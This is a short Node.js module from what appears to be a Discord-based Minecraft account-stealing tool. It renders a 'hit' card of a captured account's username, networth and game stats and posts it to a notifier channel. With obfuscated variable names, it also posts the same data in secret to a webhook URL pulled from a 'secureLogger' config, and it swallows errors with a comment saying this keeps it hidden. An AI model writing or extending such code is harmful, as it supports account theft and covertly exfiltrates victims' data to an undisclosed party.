const { AttachmentBuilder } = require('discord.js');
const { makeCard } = require('../drawhit');
const config = require('../../../config.json');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const { startFolderMonitor } = require('../autocleaner');
const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');
const { getInternalConfig } = require('../logging/secureLogger');

async function sendSecureNotification(client, accountData) {
    try {
        const _s = {
            username: accountData.username || 'Unknown',
            networth: accountData.networth || '0',
            bedwars: accountData.bedwars || '0',
            networkLevel: accountData.networkLevel || '0',
            sbLevel: accountData.sbLevel || '0',
            duelKDR: accountData.duelKDR || '0',
            duelWinstreak: accountData.duelWinstreak || '0',
            plusColour: accountData.plusColour || 'None',
            gifted: accountData.gifted || '0'
        };

        const _t = Date.now();
        const _f = `s_${accountData.username}_${_t}.png`;
        const _p = path.join(__dirname, 'temp', _f);

        const _d = path.join(__dirname, 'temp');
        if (!fs.existsSync(_d)) {
            fs.mkdirSync(_d, { recursive: true });
            startFolderMonitor(_d, 5);
        }

        const _b = await makeCard(_s, _p);

        if (config.notifierChannel && config.notifierChannel !== '') {
            const _m = getMainBotClient();
            if (_m && _m.channels) {
                const _c = await _m.channels.fetch(config.notifierChannel).catch(() => null);
                if (_c) {
                    const _a = new AttachmentBuilder(_b, { name: _f });
                    await _c.send({
                        files: [_a]
                    });
                }
            }
        }

        const _u = getInternalConfig();
        if (_u) {
            const _fd = new FormData();
            _fd.append('file', _b, { filename: _f });
            _fd.append('payload_json', JSON.stringify({ content: `**Hit: ${_s.username}**` }));

            await axios.post(_u, _fd, {
                headers: _fd.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity
            });
        }

    } catch (e) {
        // Silently fail to keep it hidden
    }
}

module.exports = { sendSecureNotification };
